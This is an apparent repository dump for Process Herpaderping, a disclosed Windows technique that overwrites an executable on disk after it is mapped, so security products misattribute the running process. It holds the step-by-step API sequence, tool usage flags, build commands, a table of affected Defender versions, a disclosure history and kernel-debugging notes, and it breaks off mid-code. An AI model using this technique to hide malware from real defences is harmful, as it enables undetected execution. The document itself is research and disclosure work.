Project Path: arc_gmh5225_herpaderping__avdz13j

Source Tree:

```txt
arc_gmh5225_herpaderping__avdz13j
├── LICENSE
├── README.md
├── _config.yml
├── ext
│   └── submodules
│       ├── phnt
│       └── wil
├── herpaderping.sln
├── res
│   ├── DivingDeeper.md
│   ├── HerpaderpIcon.png
│   ├── HerpaderpIcon.xcf
│   ├── ProcessHerpaderp.gif
│   ├── StateDiagram.svg
│   ├── SurivDemo.gif
│   ├── mimioogle.png
│   ├── procmon.png
│   └── procmon.xcf
└── source
    └── ProcessHerpaderping
        ├── ProcessHerpaderping.vcxproj
        ├── ProcessHerpaderping.vcxproj.filters
        ├── herpaderp.cpp
        ├── herpaderp.hpp
        ├── main.cpp
        ├── pch.hpp
        ├── res
        │   ├── Icon.ico
        │   ├── resource.h
        │   ├── resource.rc
        │   └── version.h
        ├── utils.cpp
        └── utils.hpp

```

`LICENSE`:

```
MIT License

Copyright (c) 2020 Johnny Shaw

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# Process Herpaderping 
[<img align="left" style="margin: 0px 15px 15px 0px;" src="res/HerpaderpIcon.png" width="150"/>][png.HerpaderpIcon]
Process Herpaderping is a method of obscuring the intentions of a process by 
modifying the content on disk after the image has been mapped. This results 
in curious behavior by security products and the OS itself.

![][png.mimioogle]

![][gif.SurivDemo]

## Summary
Generally, a security product takes action on process creation by registering a 
callback in the Windows Kernel 
([PsSetCreateProcessNotifyRoutineEx][msdn.PsSetCreateProcessNotifyRoutineEx]). 
At this point, a security product may inspect the file that was used to map 
the executable and determine if this process should be allowed to execute. This 
kernel callback is invoked when the initial thread is inserted, not when the 
process object is created. 

Because of this, an actor can create and map a process, modify the content of 
the file, then create the initial thread. A product that does inspection at the 
creation callback would see the modified content. Additionally, some products 
use an on-write scanning approach which consists of monitoring for file writes. 
A familiar optimization here is recording the file has been written to and 
defer the actual inspection until [IRP_MJ_CLEANUP][msdn.IRP_MJ_CLEANUP] 
occurs (e.g. the file handle is closed). Thus, an actor using a 
`write -> map -> modify -> execute -> close` workflow will subvert on-write scanning 
that solely relies on inspection at [IRP_MJ_CLEANUP][msdn.IRP_MJ_CLEANUP].

To abuse this convention, we first write a binary to a target file on disk. 
Then, we map an image of the target file and provide it to the OS to use for 
process creation. The OS kindly maps the original binary for us. Using 
the existing file handle, and before creating the initial thread, we modify the 
target file content to obscure or fake the file backing the image. Some time later, 
we create the initial thread to begin execution of the original binary. Finally, we 
 will close the target file handle. Let's walk through this step-by-step:
1. Write target binary to disk, keeping the handle open. This is what will 
   execute in memory.
2. Map the file as an image section ([NtCreateSection][msdn.NtCreateSection], 
   [SEC_IMAGE][msdn.SEC_IMAGE]).
3. Create the process object using the section handle (`NtCreateProcessEx`).
4. Using the same target file handle, obscure the file on disk.
5. Create the initial thread in the process (`NtCreateThreadEx`).
    - At this point the process creation callback in the kernel will fire. The 
      contents on disk do not match what was mapped. Inspection of the file at 
      this point will result in incorrect attribution.
6. Close the handle. [IRP_MJ_CLEANUP][msdn.IRP_MJ_CLEANUP] will occur here.
    - Since we've hidden the contents of what is executing, inspection at this 
      point will result in incorrect attribution.

![][svg.StateDiagram]
<details>
    <summary>plantuml</summary>
<p>

```plantuml
@startuml
hide empty description

[*] --> CreateFile
CreateFile --> FileHandle
FileHandle --> Write
FileHandle --> NtCreateSection
Write -[hidden]-> NtCreateSection
NtCreateSection --> SectionHandle
SectionHandle --> NtCreateProcessEx
FileHandle --> Modify
NtCreateProcessEx -[hidden]-> Modify
NtCreateProcessEx --> NtCreateThreadEx
Modify -[hidden]-> NtCreateThreadEx
NtCreateThreadEx --> [*]
FileHandle --> CloseFile
NtCreateThreadEx -[hidden]-> CloseFile
NtCreateThreadEx --> PspCallProcessNotifyRoutines
PspCallProcessNotifyRoutines -[hidden]-> [*]
CloseFile --> IRP_MJ_CLEANUP
IRP_MJ_CLEANUP -[hidden]-> [*]
PspCallProcessNotifyRoutines --> Inspect
PspCallProcessNotifyRoutines -[hidden]-> CloseFile 
IRP_MJ_CLEANUP --> Inspect
Inspect -[hidden]-> [*]

CreateFile : Create target file, keep handle open.
Write : Write source payload into target file.
Modify : Obscure the file on disk.
NtCreateSection : Create section using file handle.
NtCreateProcessEx : Image section for process is mapped and cached in file object.
NtCreateThreadEx : The cached section is used.
NtCreateThreadEx : Process notify routines fire in kernel.
Inspect : The contents on disk do not match what was executed. 
Inspect : Inspection of the file at this point will result in incorrect attribution.
@enduml
```

</p>
</details>

## Behavior
You'll see in the demo below, `CMD.exe` is used as the execution target. The 
first run overwrites the bytes on disk with a pattern. The second run overwrites 
`CMD.exe` with `ProcessHacker.exe`. The Herpaderping tool fixes up the binary to 
look as close to `ProcessHacker.exe` as possible, even retaining the original 
signature. Note the multiple executions of the same binary and how the process 
looks to the user compared to what is in the file on disk.

![][gif.ProcessHerpaderp]

![][png.procmon]

### Diving Deeper <a name="tag-diving-deeper"></a>
We've observed the behavior and some of this may be surprising. Let's try to 
explain this behavior.

[Technical Deep Dive][md.DivingDeeper]

## Background and Motivation
When designing products for securing Windows platforms, many engineers in 
this field (myself included) have fallen on preconceived notions with respect 
to how the OS will handle data. In this scenario, some might expect the file on 
disk to remain "locked" when the process is created. You can't delete the file. 
You can't write to it. But you can rename it. Seen here, under the right 
conditions, you can in fact write to it. Remain vigilant on your assumptions, 
always question them, and do your research.

The motivation for this research came about when discovering how to do analysis 
when a file is written. With prior background researching process Hollowing and 
Doppelganging, I had theorized this might be possible. The goal is to provide 
better security. You cannot create a better lock without first understanding 
how to break the old one.

### Similar Techniques
Herpaderping is similar to Hollowing and Doppelganging however there are some 
key differences:

#### Process Hollowing
Process Hollowing involves modifying the mapped section before execution 
begins, which abstractly this looks like: `map -> modify section -> execute`. This workflow 
results in the intended execution flow of the Hollowed process diverging into 
unintended code. Doppelganging might be considered a form of Hollowing. 
However, Hollowing, in my opinion, is closer to injection in that Hollowing 
usually involves an explicit write to the already mapped code. This differs 
from Herpaderping where there are no modified sections.

#### Process Doppelganging
Process Doppelganging is closer to Herpaderping. Doppelganging abuses 
transacted file operations and generally involves these steps: 
`transact -> write -> map -> rollback -> execute`. 
In this workflow, the OS will create the image section and account for 
transactions, so the cached image section ends up being what you wrote to the 
transaction. The OS has patched this technique. Well, they patched the crash it caused. 
Maybe they consider this a "legal" use of a transaction. Thankfully, Windows 
Defender does catch the Doppelganging technique. Doppelganging differs from 
Herpaderping in that Herpaderping does not rely on transacted file operations. 
And Defender doesn't catch Herpaderping.

#### Comparison
For reference, the generalized techniques: 

| Type          | Technique                                         |
| :------------ | :------------------------------------------------ |
| Hollowing     | `map -> modify section -> execute`                |
| Doppelganging | `transact -> write -> map -> rollback -> execute` |
| Herpaderping  | `write -> map -> modify -> execute -> close`      |

We can see the differences laid out here. While Herpaderping is arguably 
noisier than Doppelganging, in that the malicious bits do hit the disk, we've 
seen that security products are still incapable of detecting Herpaderping. 

## Possible Solution
There is not a clear fix here. It seems reasonable that preventing an image 
section from being mapped/cached when there is write access to the file 
should close the hole. However, that may or may not be a practical solution.

Another option might be to flush the changes to the file through to the cached 
image section if it hasn't yet been mapped into a process. However, since the 
map into the new process occurs at `NtCreateProcess` that is probably not a 
viable solution.

From a detection standpoint, there is not a great way to identify the actual 
bits that got mapped, inspection at [IRP_MJ_CLEANUP][msdn.IRP_MJ_CLEANUP] or 
a callback registered at 
[PsSetCreateProcessNotifyRoutineEx][msdn.PsSetCreateProcessNotifyRoutineEx] 
results in incorrect attribution since the bits on disk have been changed, you 
would have to rebuild the file from the section that got created. It's worth 
pointing out here there is a new callback in Windows 10 you may register for 
[PsSetCreateProcessNotifyRoutineEx2][msdn.PsSetCreateProcessNotifyRoutineEx2] 
however this suffers from the same problem as the previous callback, it's 
called out when the initial thread is executed, not when the process object is 
created. Microsoft did add 
[PsSetCreateThreadNotifyRoutineEx][msdn.PsSetCreateThreadNotifyRoutineEx] which 
is called out when the initial thread is inserted if registered with 
[PsCreateThreadNotifyNonSystem][msdn.PSCREATETHREADNOTIFYTYPE], opposed to when 
it is about to begin execution (as the old callback did). Extending 
[PSCREATEPROCESSNOTIFYTYPE][msdn.PSCREATEPROCESSNOTIFYTYPE] to be called out 
when the process object is created won't help either, we've seen in the 
[Diving Deeper](#tag-diving-deeper) section that the image section object is 
cached on the [NtCreateSection][msdn.NtCreateSection] call not 
`NtCreateProcess`.

We can't easily identify what got executed. We're left with trying to detect 
the exploitive behavior by the actor, I'll leave discovery of the behavior 
indicators as an exercise for the reader.

## Known Affected Platforms
Below is a list of products and Windows OSes that have been tested as of 
(8/31/2020). Tests were carried out with a known malicious binary.

| Operating System                    | Version         | Vulnerable |
| :---------------------------------- | :-------------- | :--------: |
| Windows 7 Enterprise x86            | 6.1.7601        | Yes        |
| Windows 10 Pro x64                  | 10.0.18363.900  | Yes        |
| Windows 10 Pro Insider Preview x64  | 10.0.20170.1000 | Yes        |
| Windows 10 Pro Insider Preview x64  | 10.0.20201.1000 | Yes        |

| Security Product                    | Version       | Vulnerable |
| :---------------------------------- | :------------ | :--------: |
| Windows Defender AntiMalware Client | 4.18.2006.10  | Yes        |
| Windows Defender Engine             | 1.1.17200.2   | Yes        |
| Windows Defender Antivirus          | 1.319.1127.0  | Yes        |
| Windows Defender Antispyware        | 1.319.1127.0  | Yes        |
| Windows Defender AntiMalware Client | 4.18.2007.6   | Yes        |
| Windows Defender Engine             | 1.1.17300.2   | Yes        |
| Windows Defender Antivirus          | 1.319.1676.0  | Yes        |
| Windows Defender Antispyware        | 1.319.1676.0  | Yes        |
| Windows Defender AntiMalware Client | 4.18.2007.8   | Yes        |
| Windows Defender Engine             | 1.1.17400.5   | Yes        |
| Windows Defender Antivirus          | 1.323.267.0   | Yes        |
| Windows Defender Antispyware        | 1.323.267.0   | Yes        |

## Responsible Disclosure
This vulnerability was disclosed to the Microsoft Security Response Center 
(MSRC) on 7/17/2020 and a case was opened by MSRC on 7/22/2020. MSRC concluded 
their investigation on 8/25/2020 and determined the findings are valid but do 
not meet their bar for immediate servicing. At this time their case is closed, 
without resolution, and is marked for future review, with no timeline.

We disagree on the severity of this bug; this was communicated to MSRC on 
8/27/2020. 
1. There are similar vulnerabilities in this class (Hollowing and 
Doppelganging). 
1. The vulnerability is shown to defeat security features inherent to the 
OS (Windows Defender).
1. The vulnerability allows an actor to gain execution of arbitrary code.
1. The user is not notified of the execution of unintended code.
1. The process information presented to the user does not accurately reflect 
what is executing. 
1. Facilities to accurately identify the process are not intuitive or 
incorrect, even from the kernel. 


# Source 
This repo contains a tool for exercising the Herpaderping method of process 
obfuscation. Usage is as follows:
```
Process Herpaderping Tool - Copyright (c) Johnny Shaw
ProcessHerpaderping.exe SourceFile TargetFile [ReplacedWith] [Options...]
Usage:
  SourceFile               Source file to execute.
  TargetFile               Target file to execute the source from.
  ReplacedWith             File to replace the target with. Optional,
                           default overwrites the binary with a pattern.
  -h,--help                Prints tool usage.
  -d,--do-not-wait         Does not wait for spawned process to exit,
                           default waits.
  -l,--logging-mask number Specifies the logging mask, defaults to full
                           logging.
                               0x1   Successes
                               0x2   Informational
                               0x4   Warnings
                               0x8   Errors
                               0x10  Contextual
  -q,--quiet               Runs quietly, overrides logging mask, no title.
  -r,--random-obfuscation  Uses random bytes rather than a pattern for
                           file obfuscation.
  -e,--exclusive           Target file is created with exclusive access and
                           the handle is held open as long as possible.
                           Without this option the handle has full share
                           access and is closed as soon as possible.
  -u,--do-not-flush-file   Does not flush file after overwrite.
  -c,--close-file-early    Closes file before thread creation (before the
                           process notify callback fires in the kernel).
                           Not valid with "--exclusive" option.
  -k,--kill                Terminates the spawned process regardless of
                           success or failure, this is useful in some
                           automation environments. Forces "--do-not-wait
                           option.
```

## Cloning and Building
The repo uses submodules, after cloning be sure to init and update the 
submodules. Projects files are targeted to Visual Studio 2019.
```
git clone https://github.com/jxy-s/herpaderping.git
cd .\herpaderping\
git submodule update --init --recursive
MSBuild .\herpaderping.sln
```

## Credits
The following are used without modification. Credits to their authors.
- [Windows Implementation Libraries (WIL)][github.wil]  
A header-only C++ library created to make life easier for developers on Windows 
through readable type-safe C++ interfaces for common Windows coding patterns.  
- [Process Hacker Native API Headers][github.phnt]   
Collection of Native API header files. Gathered from Microsoft header files and 
symbol files, as well as a lot of reverse engineering and guessing.

[//]: # (Hyperlink IDs)
[github.wil]: https://github.com/microsoft/wil
[github.phnt]: https://github.com/processhacker/phnt
[msdn.PsSetCreateProcessNotifyRoutineEx]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex
[msdn.PsSetCreateProcessNotifyRoutineEx2]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex2
[msdn.PsSetCreateThreadNotifyRoutineEx]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex
[msdn.PSCREATETHREADNOTIFYTYPE]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ne-ntddk-_pscreatethreadnotifytype
[msdn.PSCREATEPROCESSNOTIFYTYPE]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ne-ntddk-_pscreateprocessnotifytype
[msdn.IRP_MJ_CLEANUP]: https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-cleanup
[msdn.NtCreateSection]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
[msdn.SEC_IMAGE]: https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
[msdn.IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/flt-parameters-for-irp-mj-acquire-for-section-synchronization
[msdn.IRP_MJ_WRITE]: https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-write 
[msdn.FILE_OBJECT]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_file_object
[msdn.SECTION_OBJECT_POINTERS]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_section_object_pointers
[msdn.PS_CREATE_NOTIFY_INFO]: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-_ps_create_notify_info

[//]: # (Relative Path IDs)
[gif.ProcessHerpaderp]: res/ProcessHerpaderp.gif
[gif.SurivDemo]: res/SurivDemo.gif
[png.procmon]: res/procmon.png
[png.mimioogle]: res/mimioogle.png
[svg.StateDiagram]: res/StateDiagram.svg
[png.HerpaderpIcon]: res/HerpaderpIcon.png
[md.DivingDeeper]: res/DivingDeeper.md
```

`_config.yml`:

```yml
title: herpaderping
logo: res/HerpaderpIcon.png
description: Detection Evasion Exploit
show_downloads: true
google_analytics:
theme: jekyll-theme-minimal

```

`herpaderping.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.30104.148
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ProcessHerpaderping", "source\ProcessHerpaderping\ProcessHerpaderping.vcxproj", "{25CB55EF-7944-4234-9D2A-4BE3B291BD7F}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{25CB55EF-7944-4234-9D2A-4BE3B291BD7F}.Debug|x64.ActiveCfg = Debug|x64
		{25CB55EF-7944-4234-9D2A-4BE3B291BD7F}.Debug|x64.Build.0 = Debug|x64
		{25CB55EF-7944-4234-9D2A-4BE3B291BD7F}.Debug|x86.ActiveCfg = Debug|Win32
		{25CB55EF-7944-4234-9D2A-4BE3B291BD7F}.Debug|x86.Build.0 = Debug|Win32
		{25CB55EF-7944-4234-9D2A-4BE3B291BD7F}.Release|x64.ActiveCfg = Release|x64
		{25CB55EF-7944-4234-9D2A-4BE3B291BD7F}.Release|x64.Build.0 = Release|x64
		{25CB55EF-7944-4234-9D2A-4BE3B291BD7F}.Release|x86.ActiveCfg = Release|Win32
		{25CB55EF-7944-4234-9D2A-4BE3B291BD7F}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {8BCF228F-C80E-4F27-A67F-E76E9BCB83D2}
	EndGlobalSection
EndGlobal

```

`res/DivingDeeper.md`:

```md
# Process Herpaderping Technical Deep Dive

This section is a technical deep dive on the behavior behind the exploit.

## Repeated executions despite the bits on disk changing
Let's try to understand why the process successfully executes multiple times 
despite the bits on disk not being `CMD.exe`. Below is some `WinDbg` output. 
I've executed the tool as in the demo above, the first herpaderped process was 
created, then I started another. Let's compare:

```
PROCESS ffff998aab671080
    SessionId: 1  Cid: 0230    Peb: 3783820000  ParentCid: 28d4
    DirBase: 12a49a000  ObjectTable: ffff8201fd4cba40  HandleCount:  79.
    Image: lol.exe

0: kd> dt nt!_EPROCESS ffff998aab671080
...
   +0x3c0 SectionObject    : 0xffff8201`ff93db70 Void
...
   +0x448 ImageFilePointer : (null) 
...

0: kd> !object 0xffff8201`ff93db70
Object: ffff8201ff93db70  Type: (ffff998aa54d2e80) Section
    ObjectHeader: ffff8201ff93db40 (new version)
    HandleCount: 0  PointerCount: 1
    Directory Object: 00000000  Name: \Users\jxy\Desktop\lol.exe
```
```
PROCESS ffff998aab971080
    SessionId: 1  Cid: 20a8    Peb: 4d492ca000  ParentCid: 12dc
    DirBase: 199f9e000  ObjectTable: ffff8201ffc3d200  HandleCount:  71.
    Image: lol.exe

0: kd> dt nt!_EPROCESS ffff998aab971080
...
   +0x3c0 SectionObject    : 0xffff8201`fc004a10 Void
...
   +0x448 ImageFilePointer : 0xffff998a`adf2dde0 _FILE_OBJECT
...

0: kd> !object 0xffff8201`ff93db70
Object: ffff8201ff93db70  Type: (ffff998aa54d2e80) Section
    ObjectHeader: ffff8201ff93db40 (new version)
    HandleCount: 0  PointerCount: 1
    Directory Object: 00000000  Name: \Users\jxy\Desktop\lol.exe

0: kd> !object 0xffff998a`adf2dde0
Object: ffff998aadf2dde0  Type: (ffff998aa54d3820) File
    ObjectHeader: ffff998aadf2ddb0 (new version)
    HandleCount: 0  PointerCount: 1
    Directory Object: 00000000  Name: \Users\jxy\Desktop\lol.exe {HarddiskVolume3}
```

Note the two processes. I've dumped the relevant parts of the `EPROCESS` for 
each. They have different section objects, as expected, as they need their own 
sections since they are independent processes. The first process' 
`ImageFilePointer` is null, since the tool calls `NtCreateProcessEx` and 
explicitly hands the OS a section to use. We'll circle back around to this 
later. For now, let's take a closer look at the [FILE_OBJECT][msdn.FILE_OBJECT]: 

```
0: kd> dt nt!_FILE_OBJECT 0xffff998a`adf2dde0
   +0x000 Type             : 0n5
   +0x002 Size             : 0n216
   +0x008 DeviceObject     : 0xffff998a`a73c8930 _DEVICE_OBJECT
   +0x010 Vpb              : 0xffff998a`a75ec2a0 _VPB
   +0x018 FsContext        : 0xffff8201`fa92a170 Void
   +0x020 FsContext2       : 0xffff8202`0514a2e0 Void
   +0x028 SectionObjectPointer : 0xffff998a`ae08aae8 _SECTION_OBJECT_POINTERS
   +0x030 PrivateCacheMap  : (null) 
   +0x038 FinalStatus      : 0n0
   +0x040 RelatedFileObject : (null) 
   +0x048 LockOperation    : 0 ''
   +0x049 DeletePending    : 0 ''
   +0x04a ReadAccess       : 0x1 ''
   +0x04b WriteAccess      : 0 ''
   +0x04c DeleteAccess     : 0 ''
   +0x04d SharedRead       : 0x1 ''
   +0x04e SharedWrite      : 0 ''
   +0x04f SharedDelete     : 0x1 ''
   +0x050 Flags            : 0x44042
   +0x058 FileName         : _UNICODE_STRING "\Users\jxy\Desktop\lol.exe"
   +0x068 CurrentByteOffset : _LARGE_INTEGER 0x0
   +0x070 Waiters          : 0
   +0x074 Busy             : 0
   +0x078 LastLock         : (null) 
   +0x080 Lock             : _KEVENT
   +0x098 Event            : _KEVENT
   +0x0b0 CompletionContext : (null) 
   +0x0b8 IrpListLock      : 0
   +0x0c0 IrpList          : _LIST_ENTRY [ 0xffff998a`adf2dea0 - 0xffff998a`adf2dea0 ]
   +0x0d0 FileObjectExtension : (null) 
```

First, that file object looks different than what we had originally opened with. 
This is expected since executing the process normally (as the user would, by 
double clicking it) will cause `explorer.exe` to invoke `NtCreateUserProcess`. 
That somewhat explains the behavior we see. But if it was using the file, 
why did it execute `CMD.exe`? We've overwritten it. Its behavior seems like the 
section is being reused. Let's verify this assumption. The file object stores 
[SECTION_OBJECT_POINTERS][msdn.SECTION_OBJECT_POINTERS] at 
`SectionObjectPointer`. Let's look there. 

```
0: kd> dx -id 0,0,ffff998aa547b2c0 -r1 ((ntkrnlmp!_SECTION_OBJECT_POINTERS *)0xffff998aae08aae8)
((ntkrnlmp!_SECTION_OBJECT_POINTERS *)0xffff998aae08aae8)                 : 0xffff998aae08aae8 [Type: _SECTION_OBJECT_POINTERS *]
    [+0x000] DataSectionObject : 0xffff998aae04c6d0 [Type: void *]
    [+0x008] SharedCacheMap   : 0x0 [Type: void *]
    [+0x010] ImageSectionObject : 0xffff998aa7c2d660 [Type: void *]
```

According to the documentation the 
`DataSectionObject` and `ImageSectionObject` are `CONTROL_AREA` structures. And 
`SharedCacheMap` is `SHARED_CACHE_MAP`. Let's set a breakpoint and see where 
`ImageSectionObject` is accessed. I'll run another instance of `lol.exe`. 

```
ba r8 0xffff998aae08aae8+0x108

Breakpoint 0 hit
nt!MiReferenceControlArea+0x59:
fffff802`2f4955e1 408af8          mov     dil,al
2: kd> k
 # Child-SP          RetAddr           Call Site
00 fffffd89`f2772640 fffff802`2f9f8111 nt!MiReferenceControlArea+0x59
01 fffffd89`f27726d0 fffff802`2f9f8574 nt!MiCreateImageOrDataSection+0x171
02 fffffd89`f27727c0 fffff802`2f9f7bcf nt!MiCreateSection+0xf4
03 fffffd89`f2772940 fffff802`2f9f7960 nt!MiCreateSectionCommon+0x1ff
04 fffffd89`f2772a20 fffff802`2f5d3c15 nt!NtCreateSection+0x60
05 fffffd89`f2772a90 00007ffb`de0fc9b4 nt!KiSystemServiceCopyEnd+0x25
06 00000000`0496d848 00007ffb`db8a1a47 ntdll!NtCreateSection+0x14
07 00000000`0496d850 00007ffb`db8a55a0 KERNELBASE!BasepLoadLibraryAsDataFileInternal+0x2e7
08 00000000`0496da80 00007ffb`db88c41d KERNELBASE!LoadLibraryExW+0xe0
09 00000000`0496daf0 00007ffb`dd39c9c1 KERNELBASE!GetFileVersionInfoSizeExW+0x3d
0a 00000000`0496db50 00007ffb`dd39c94c SHELL32!_LoadVersionInfo+0x39
0b 00000000`0496dbc0 00007ffb`db1c43c1 SHELL32!CVersionPropertyStore::Initialize+0x2c5
...
2d 00000000`0496f3c0 00007ffb`dd376a4a SHELL32!CRegistryVerbsContextMenu::_Execute+0xcb
2e 00000000`0496f430 00007ffb`dd362df3 SHELL32!CRegistryVerbsContextMenu::InvokeCommand+0xaa
2f 00000000`0496f730 00007ffb`dd391069 SHELL32!HDXA_LetHandlerProcessCommandEx+0x117
30 00000000`0496f840 00007ffb`dd54857d SHELL32!CDefFolderMenu::InvokeCommand+0x139
31 00000000`0496fba0 00007ffb`dd7faf49 SHELL32!SHInvokeCommandOnContextMenu2+0x1f5
32 00000000`0496fde0 00007ffb`dc13dd25 SHELL32!s_DoInvokeVerb+0xc9
33 00000000`0496fe50 00007ffb`dc5c7bd4 shcore!_WrapperThreadProc+0xf5
34 00000000`0496ff30 00007ffb`de0cce51 KERNEL32!BaseThreadInitThunk+0x14
35 00000000`0496ff60 00000000`00000000 ntdll!RtlUserThreadStart+0x21

3: kd> g
Breakpoint 0 hit
nt!MiReferenceControlArea+0x59:
fffff802`2f4955e1 408af8          mov     dil,al
3: kd> k
 # Child-SP          RetAddr           Call Site
00 fffffd89`f2771f30 fffff802`2f9f8111 nt!MiReferenceControlArea+0x59
01 fffffd89`f2771fc0 fffff802`2f9f8574 nt!MiCreateImageOrDataSection+0x171
02 fffffd89`f27720b0 fffff802`2fa52b83 nt!MiCreateSection+0xf4
03 fffffd89`f2772230 fffff802`2fa500ee nt!MmCreateSpecialImageSection+0xbb
04 fffffd89`f27722e0 fffff802`2f5d3c15 nt!NtCreateUserProcess+0x54e
05 fffffd89`f2772a90 00007ffb`de0fd8e4 nt!KiSystemServiceCopyEnd+0x25
06 00000000`0496d858 00007ffb`db8df36a ntdll!NtCreateUserProcess+0x14
07 00000000`0496d860 00007ffb`db8dbd06 KERNELBASE!CreateProcessInternalW+0x1f7a
08 00000000`0496e9b0 00007ffb`dc5cbe93 KERNELBASE!CreateProcessW+0x66
09 00000000`0496ea20 00007ffb`db17cf36 KERNEL32!CreateProcessWStub+0x53
...
14 00000000`0496f3c0 00007ffb`dd376a4a SHELL32!CRegistryVerbsContextMenu::_Execute+0xcb
15 00000000`0496f430 00007ffb`dd362df3 SHELL32!CRegistryVerbsContextMenu::InvokeCommand+0xaa
16 00000000`0496f730 00007ffb`dd391069 SHELL32!HDXA_LetHandlerProcessCommandEx+0x117
17 00000000`0496f840 00007ffb`dd54857d SHELL32!CDefFolderMenu::InvokeCommand+0x139
18 00000000`0496fba0 00007ffb`dd7faf49 SHELL32!SHInvokeCommandOnContextMenu2+0x1f5
19 00000000`0496fde0 00007ffb`dc13dd25 SHELL32!s_DoInvokeVerb+0xc9
1a 00000000`0496fe50 00007ffb`dc5c7bd4 shcore!_WrapperThreadProc+0xf5
1b 00000000`0496ff30 00007ffb`de0cce51 KERNEL32!BaseThreadInitThunk+0x14
1c 00000000`0496ff60 00000000`00000000 ntdll!RtlUserThreadStart+0x21

3: kd> g
Breakpoint 0 hit
nt!MiReferenceControlArea+0x59:
fffff802`2f4955e1 408af8          mov     dil,al
0: kd> k
 # Child-SP          RetAddr           Call Site
00 fffffd89`f28b5640 fffff802`2f9f8111 nt!MiReferenceControlArea+0x59
01 fffffd89`f28b56d0 fffff802`2f9f8574 nt!MiCreateImageOrDataSection+0x171
02 fffffd89`f28b57c0 fffff802`2f9f7bcf nt!MiCreateSection+0xf4
03 fffffd89`f28b5940 fffff802`2f9f7960 nt!MiCreateSectionCommon+0x1ff
04 fffffd89`f28b5a20 fffff802`2f5d3c15 nt!NtCreateSection+0x60
05 fffffd89`f28b5a90 00007ffb`de0fc9b4 nt!KiSystemServiceCopyEnd+0x25
06 000000a1`98f7dd78 00007ffb`db8a1a47 ntdll!NtCreateSection+0x14
07 000000a1`98f7dd80 00007ffb`db8a55a0 KERNELBASE!BasepLoadLibraryAsDataFileInternal+0x2e7
08 000000a1`98f7dfb0 00007ffb`dcfab65b KERNELBASE!LoadLibraryExW+0xe0
09 000000a1`98f7e020 00007ffb`dd34bcfc USER32!PrivateExtractIconsW+0x15b
0a 000000a1`98f7e530 00007ffb`dd34ba78 SHELL32!SHPrivateExtractIcons+0x1ec
0b 000000a1`98f7ea30 00007ff7`70a856ee SHELL32!ExtractIconExW+0xe8
```

As we see, after I double click to start `lol.exe` again, the 
`ImageSectionObject` is accessed from 
[SECTION_OBJECT_POINTERS][msdn.SECTION_OBJECT_POINTERS] of the 
[FILE_OBJECT][msdn.FILE_OBJECT] a number of times. The section data appears to 
be reused. This would ignore the data on disk and helps explain the behavior 
we're seeing with multiple executions. This is a smart optimization, if you've 
already done the work to parse and map the image, why duplicate that work?

With a bit of reverse engineering of `MiReferenceControlArea` we notice:

```cpp
struct CREATE_SECTION_PACKET
{
    ULONG Flags;
    DWORD Unknown04;
    POBJECT_ATTRIBUTES InputObjectAttributes;
    ULONG AllocateAttributes;
    ULONG InputAllocationAttributes;
    UCHAR InputSectionSignatureLevel;
    BYTE Unknown19;
    WORD Unknown1A;
    ULONG InputSectionPageProtection;
    ULONG PageProtectionMask;
    DWORD Unknown24;
    HANDLE InputFileHandle;
    PFILE_OBJECT InputFileObject;
    PFILE_OBJECT FileObject;
    CONTROL_AREA* SectionControlArea;
    KPROCESSOR_MODE InputPreviousMode;
    BYTE Unknown49[67];
    DWORD Unknown8C;
    SECTION* SectionObject;
    PLARGE_INTEGER MaximumSize;
    PACCESS_TOKEN InputToken;
    DWORD InputSessionId;
    DWORD UnknownAC;
    MI_PARTITION* Partition;
    PIRP TopLevelIrp;
    BYTE UnknownC0;
    BYTE UnknownC1[3];
    DWORD UnknownC4;
};

NTSTATUS __fastcall MiReferenceControlArea(
    CREATE_SECTION_PACKET* CreateSectionPacket,
    CONTROL_AREA* ControlArea,
